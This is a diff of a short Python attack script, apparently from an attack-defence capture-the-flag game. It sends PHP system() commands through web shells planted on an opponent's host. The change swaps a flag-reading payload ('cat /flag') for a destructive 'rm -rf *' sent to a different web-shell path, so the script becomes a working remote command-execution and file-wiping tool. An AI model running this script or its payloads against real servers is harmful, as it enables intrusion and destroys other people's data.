@@ -15,8 +15,8 @@ def attack(ip:str):
     """
     try:
         # cookies = {"PHPSESSID": "vg8rjkjtbugu49v6f7cq71pth0"}
-        data = {'s': 'system(\'cat /flag\');'}
-        res = requests.post('http://'+ip+'/assets/imgs/config.php',data = data)
+        data = {'123': 'system(\'rm -rf \*\');'}
+        res = requests.post('http://'+ip+'/images/yjh.php',data = data)
         print(res.text)
         print('get flag!')
         flag = res.text
@@ -28,4 +28,4 @@ def attack(ip:str):
 
 
 if __name__ == '__main__':
-    attack(input('input attack ip(such as:192-168-1-1.pvp4151.bugku.cn):'))
+    attack(input('input attack ip(such as:192-168-1-138.pvp4151.bugku.cn):'))
